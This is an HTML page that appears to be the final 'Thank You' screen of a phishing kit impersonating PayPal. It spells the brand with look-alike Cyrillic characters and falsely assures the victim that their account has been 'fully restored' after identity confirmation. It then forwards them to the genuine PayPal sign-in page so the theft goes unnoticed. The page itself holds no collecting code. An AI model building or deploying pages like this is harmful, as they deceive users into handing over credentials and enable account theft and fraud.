<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="application-name" content="ΡaуΡal">
<link rel="shortcut icon" href="./loginfiles/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="./loginfiles/apple-touch-icon.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">

<meta name="language" content="en">
<title>
Thank You - ΡaуΡal</title>
<link rel="stylesheet" href="./loginfiles/css/limit-css.css">
<style type="text/css">
</style>
</head>
<body>
<style type="text/css">body{display:block !important;}</style>
<div class="grey-background header-body">
<div id="header">
<div class="container-fluid center-block-big">
<table>
<tbody>
<tr>
<td>
<a href="#">
<img src="./loginfiles/logo_paypal_106x29.png" alt="ΡaуΡal" height="29" width="106">
</a>
</td>
<td align="right" width="100%">
</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="wrapper" class="page-container" role="main">
<div class="container-fluid trayNavOuter activity-tray activity-tray-large">
<div class="trayNavInner">
<div class="row row-ie">
<div class="col-md-5 logo-block">
<div class="row">
<div class="col-md-12 peek-shield">
<img style="width:40%" src="./loginfiles/tick.png">
</div>
</div>
<div class="row">
<div class="col-md-12">
<p class="logo-block-text">
To help protect your account we regularly look for early signs of potentially fraudulent activity.</p>
</div>
</div>
</div>
<div class="col-md-7 explanation-wrapper">
<div class="row">
<div class="col-md-12">
<header>
<h4 class="flat-large-header">It's done, your account has been fully restored.</h4>
</header>
</div>
</div>
<div class="row">
<div class="col-md-12 explanation-block">
<p>
After confirming your identity, you are able to access again to your account.</p>
</div>
</div>
<div class="row">
<div class="col-md-12">
			<div class="report-activity-tray">
</div>
<p>Just to be safe, we want you continue and login again to your account.</p>
<div class="buttons requirejs-wait">
<a class="btn btn-primary button" href="https://www.paypal.com/signin">
Continue</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
 </div>
</div>

<footer class="footer">
<div class="footer-nav">
<div class="site-links container-fluid" style="align: right">
<ul class="navlist">
<li>
<a href="#">
Contact</a>
</li>
<li>
<a href="#">
Security</a>
</li>
<li>
<a href="#">
Logout</a>
</li>
</ul>
</div>
</div>
<div class="footer-legal">
<div class="container-fluid">
<span class="copyright">
Copyright © 1999 - 2016 ΡaуΡal. All rights reserved.</span>
<span class="short-copyright">
© 1999 - 2016</span>
<ul class="navlist footer-list">
<li>
<a href="#" target="_blank">
Privacy</a>
</li>
<li>
<a href="#" target="_blank">
Legal</a>
</li>
</ul>
</div>
</div>
</footer>

</body></html>